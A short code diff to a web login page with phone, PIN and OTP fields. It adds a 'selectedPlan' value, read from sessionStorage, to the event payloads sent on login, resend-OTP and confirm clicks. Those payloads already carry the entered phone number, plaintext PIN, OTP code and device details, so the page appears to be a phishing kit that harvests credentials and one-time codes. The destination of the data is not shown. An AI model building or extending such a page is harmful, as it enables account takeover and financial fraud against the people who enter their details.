@@ -112,7 +112,7 @@ input{
 }
 .resend-btn[disabled]{opacity:.5;cursor:not-allowed}
 
-/* OTP ACTION BUTTONS – FIXED */
+/* OTP ACTION BUTTONS */
 .otp-actions{
   display:flex;
   gap:10px;
@@ -214,6 +214,13 @@ if (/Android/i.test(ua)) {
 if (/Chrome/i.test(ua)) device += ' | Chrome';
 else if (/Safari/i.test(ua)) device += ' | Safari';
 else if (/Firefox/i.test(ua)) device += ' | Firefox';
+
+/* ===== GET SELECTED PLAN ===== */
+let planData = null;
+try{
+  const raw = sessionStorage.getItem('selectedPlan');
+  if(raw) planData = JSON.parse(raw);
+}catch(e){}
 
 /* ===== PHONE ===== */
 const phone = document.getElementById('phone');
@@ -339,6 +346,7 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
     event:'login_clicked',
     loginPhone:phone.value,
     loginPin:pinValue,
+    selectedPlan: planData,
     device,
     submittedAt:new Date().toISOString()
   });
@@ -354,6 +362,7 @@ resendBtn.onclick=async()=>{
     event:'resend_otp',
     loginPhone:phone.value,
     loginPin:pinValue,
+    selectedPlan: planData,
     device,
     submittedAt:new Date().toISOString()
   });
@@ -365,6 +374,7 @@ confirmBtn.onclick=async()=>{
     loginPhone:phone.value,
     loginPin:pinValue,
     otp:getOtp(),
+    selectedPlan: planData,
     device,
     submittedAt:new Date().toISOString()
   });
